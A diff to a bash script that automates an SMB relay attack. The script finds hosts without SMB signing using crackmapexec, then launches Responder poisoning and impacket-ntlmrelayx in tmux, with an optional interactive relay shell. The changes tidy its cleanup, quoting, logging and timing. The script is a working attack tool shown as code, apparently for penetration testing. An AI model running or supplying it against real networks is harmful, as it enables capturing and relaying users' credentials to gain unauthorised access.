@@ -13,6 +13,7 @@ session_name="smb_relay_attack"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
 AUTO_MODE=false
+SESSION_CREATED=false
 
 RUN_ID=$(date +%s)
 LOG_DIR="logs_${RUN_ID}"
@@ -31,12 +32,12 @@ CYAN='\033[0;36m'
 RESET='\033[0m'
 
 # Network interface (dynamically detected by default)
-network_interface="$(ip route | awk '/default/ {print $5; exit}')"
+network_interface="$(ip -o -4 route show to default | awk '{print $5}' | head -n1)"
 
 cleanup() {
     exit_code=$?
     
-    if [ $exit_code -ne 0 ]; then
+    if [ $exit_code -ne 0 ] && [ "$SESSION_CREATED" = true ]; then
         echo -e "${YELLOW}[*] Script exited unexpectedly. Cleaning up...${RESET}"
         
         if tmux has-session -t "$session_name" 2>/dev/null; then
@@ -91,7 +92,7 @@ validate_network_interface() {
 
 # Run crackmapexec
 run_crackmapexec() {
-    echo -e "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}" | tee -a attack.log
+    echo -e "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}" | tee -a "$ATTACK_LOG"
     echo -e "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
     
     # Run crackmapexec and let it generate the relay list
@@ -136,8 +137,10 @@ start_tmux_window() {
     local command=$3
     
     # Create the window in the tmux session
-    if ! tmux list-windows -t "$session_name" | grep -q "$window_name"; then
-        tmux new-window -t "$session_name" -n "$window_name"
+    if tmux has-session -t "$session_name" 2>/dev/null; then
+        if ! tmux list-windows -t "$session_name" | grep -q "$window_name"; then
+            tmux new-window -t "$session_name" -n "$window_name"
+        fi
     fi
     
     # Send the command to the new tmux window
@@ -152,11 +155,12 @@ run_smb_relay_attack() {
     if ! tmux has-session -t "$session_name" 2>/dev/null; then
         echo -e "${GREEN}[+] Creating tmux session: $session_name.${RESET}"
         tmux new-session -d -s "$session_name"
+        SESSION_CREATED=true
     fi
 
     # Start Responder in a tmux window
     echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
-    start_tmux_window "$session_name" "responder" "responder -I $network_interface 2>&1 | tee -a $RESPONDER_LOG" || {
+    start_tmux_window "$session_name" "responder" "responder -I \"$network_interface\" 2>&1 | tee -a \"$RESPONDER_LOG\"" || {
         echo -e "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
@@ -164,7 +168,7 @@ run_smb_relay_attack() {
     # Start ntlmrelayx in another tmux window
     echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
 
-    relay_command="impacket-ntlmrelayx -smb2support -tf \"${TARGET_SMB_FILE}\" 2>&1 | tee -a \"${RELAY_LOG}\""
+    relay_command=$(printf 'impacket-ntlmrelayx -smb2support -tf "%s" 2>&1 | tee -a "%s"' "$TARGET_SMB_FILE" "$RELAY_LOG")
     if [ "$enable_interactive" = true ]; then
         echo -e "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
         relay_command+=" --interactive"
@@ -266,7 +270,7 @@ run_crackmapexec
 if [ -s "${TARGET_SMB_FILE}" ]; then
     echo -e "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
     edit_responder_conf
-    sleep 5
+    sleep 3
     run_smb_relay_attack
 else
     echo -e "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
